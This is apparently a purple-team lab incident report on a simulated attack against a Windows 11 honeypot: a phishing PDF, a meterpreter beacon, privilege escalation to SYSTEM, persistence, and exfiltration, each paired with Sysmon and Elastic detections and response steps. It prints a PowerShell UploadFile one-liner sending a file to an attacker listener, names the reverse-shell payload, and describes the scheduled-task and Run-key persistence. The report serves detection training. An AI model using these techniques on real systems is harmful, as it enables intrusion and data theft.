title: Purple-Team Campaign Lab - Incident Report (Plain Language)
author: CyberSec Purple-Team Lab

elements.text: What happened in one paragraph

We ran a fake cyber-attack on a test computer (a honeypot VM) to practice catching real attacks. We pretended to be a hacker: we sent a fake invitation PDF, the victim clicked a link and got infected, we escalated to the highest Windows privilege (SYSTEM), made the infection survive reboots, and stole a file back to our side. Then, as the defender, we can look at the logs (Sysmon + Elastic) and see every single step. This report explains each step in plain language.
The cast (who/what is involved)

rows: HONEYPOT - a Windows 11 test VM (192.168.254.128). It has Sysmon and Elastic agent installed, so every action it does gets reported to the SOC.
Kali Linux (msfconsole) + a Windows relay program. This is where all the attack commands are run from.
The Elastic SIEM at siem.example.com:9200, where the victim's logs stream in.
The malicious program (a 'beacon'). Its name is fake - it looks like an Office update. It secretly phones home to the hacker.
A copy of the beacon, renamed to look like a Windows Update service, hidden in C:\ProgramData\WinUpdate.
The channel the beacon uses to talk to the hacker. In the lab: 192.168.254.100 port 4443, bridged by a relay to Kali.

elements.text: Step 1 - The phish (getting in the door)

We made a PDF that looks like a real work invitation: 'Year-End Showcase Invitation'. Inside is an RSVP link. The link is actually not a website - it downloads our malware disguised as office_update.exe. The victim opens the PDF, clicks RSVP, and runs the downloaded file. That is how the attacker gets in. Real-world attackers do exactly this: a friendly-looking email or document, one click, infection.

Defender sees: the browser/Edge connecting to an unusual IP (192.168.254.100:8080), an unknown .exe appearing in Downloads (Sysmon Event ID 11), and that exe being run by explorer.exe (Sysmon Event ID 1).
Step 2 - The beacon (the secret phone line)

Once office_update.exe runs, it dials out to the hacker's server on port 4443. Important detail: the VICTIM makes the outgoing call. That is why firewalls usually do not stop it - it looks like the computer is just browsing the internet, not like someone breaking in. From that moment, the hacker can type commands (shell, file operations) and the beacon obeys. That live connection is what we call a 'meterpreter session'.
Defender sees: an unknown program opening an outbound TCP connection to a non-standard port 4443 (Sysmon Event ID 3), plus Elastic rules that specifically flag meterpreter traffic.
Step 3 - Escalating to SYSTEM (becoming the superuser)

The beacon first ran as the normal user 'honey'. A normal user cannot change machine-wide settings, so the hacker needs SYSTEM (the highest local privilege). We tried a clever exploit (EfsPotato) - it reported success but did not stick, which is a realistic detail: exploits often flake. The path that worked: (a) we made the user re-launch our beacon elevated - 'honey' is a local admin, so a UAC popup appeared and the user clicked Yes, giving us a high-integrity process; (b) from there we 'migrated' the beacon inside a system process (svchost.exe, PID 1372), a Windows service host that runs as SYSTEM. Migrate = the beacon moves its body into another process. Now getuid showed NT AUTHORITY\SYSTEM. Done.

Defender sees: a UAC elevation event (Security 4688 elevated process creation), and process-injection-style events (Sysmon EID 8/10) when the beacon moved into svchost.exe. 'Unknown process injected into svchost' is a red flag for any analyst.
Step 4 - Persistence (coming back after reboot)

A hacker who is 'inside' wants to stay inside. If the PC reboots, our office_update.exe in Downloads dies. So we planted two automatic restart triggers, both pointing at a hidden copy of the beacon (C:\ProgramData\WinUpdate\wu_service.exe):

rows: Every time the PC boots (as SYSTEM)
Works even if no user ever logs in.
Every time any user logs on
Backup trigger - if the task is deleted, this one still fires.

elements.text: This was PROVEN, not just configured: the VM rebooted while the user was at lunch, and a brand-new hacker session (session 31) appeared in msfconsole at 14:36:38 with zero user action. The scheduled task did its job. That one line of log is the smoking gun in any incident report: 'beacon reconnected automatically after reboot'.

Defender sees: a new file appearing in C:\ProgramData (Sysmon EID 11), a scheduled task created (Security 4698), and a registry value written to HKLM Run (Sysmon EID 13, Security 4657). All three are classic persistence detections.
Step 5 - Exfiltration (stealing the file)

The target file was C:\Users\honey\OneDrive\Documents\secret.txt (2,524 bytes - note: Windows 11 redirects Documents into OneDrive, which is a fun gotcha we hit live). From the beacon, we ran a one-line PowerShell command that uploads the file over HTTP to a listener we ran on our (attacker) side: (New-Object Net.WebClient).UploadFile('http://192.168.254.100:4444', ...). The file landed on the attacker machine intact - we read it back and it matched.

Two details worth highlighting for the report: (1) the exfil went to port 4444, a DIFFERENT port than the C2 port 4443 - real attackers separate their 'command channel' from their 'data channel'; (2) 'New-Object Net.WebClient' + UploadFile is one of the most reliably detected exfiltration one-liners in the security industry - a good Elastic rule flags it instantly.
Defender sees: powershell.exe spawned by svchost.exe (odd parent-child, EID 1), an outbound HTTP connection to 192.168.254.100:4444 (EID 3), and the exfil one-liner itself in the command line.
The whole story in one picture

elements.text: Lessons we learned live (the fun part)

1. Exploits flake: EfsPotato 'succeeded' but the token kept reverting - real attackers retry or switch technique, which is exactly what we did. 2. UAC is the wall: a local admin at medium integrity cannot write HKLM; one 'Yes' click on UAC changed everything. 3. Persistence is the point: the reboot-during-lunch moment, where our session re-appeared on its own, is the most satisfying 5 seconds of the whole lab. 4. Windows 11 gotcha: Documents is redirected into OneDrive - both for the attacker hunting files and for the defender hunting for evidence. 5. Session hygiene: closing the old meterpreter session killed the underlying beacon process and caused a confusing zombie session - lesson: confirm the new session works BEFORE exiting the old one.
What a defender should do (response, from the logs)

1. Kill the C2: block 192.168.254.100 at the network (ports 8080/4443/4444). 2. Remove persistence: delete scheduled task WinUpdateSvc, delete the HKLM Run value, delete C:\ProgramData\WinUpdate\. 3. Kill the process: terminate any wu_service.exe / office_update.exe. 4. Reset: change honey's password (credentials could be targeted), review other hosts for the same C2 IP. 5. Hunt: search the whole estate for EID 3 to 192.168.254.100 and for the file names, to check if any other machine got phished. 6. Report: this is where this document goes - attacker TTPs, timeline, evidence, containment steps.
Lab environment facts (for appendix)

Victim: HONEYPOT, Windows 11 24H2 build 26200, x64, WORKGROUP, 192.168.254.128 (VMware NAT, gateway .2). Attacker: Kali WSL2 (msfconsole handler 127.0.0.1:4445) + native Windows relay at 192.168.254.100 (HTTP 8080, relay 4443). SIEM: Elastic 9.4.5 at siem.example.com:9200, Sysmon + Elastic agent on victim, alerts index .internal.alerts-security.*, logs in logs-* / .ds-logs-*. Payload: windows/x64/meterpreter_reverse_tcp, -f exe. Defender real-time protection was disabled for the exercise.
Exfiltrated sample recovered at: C:\Users\style\lab\exfil\secret.txt (2,718 bytes including HTTP framing; original 2,524 bytes verified intact).
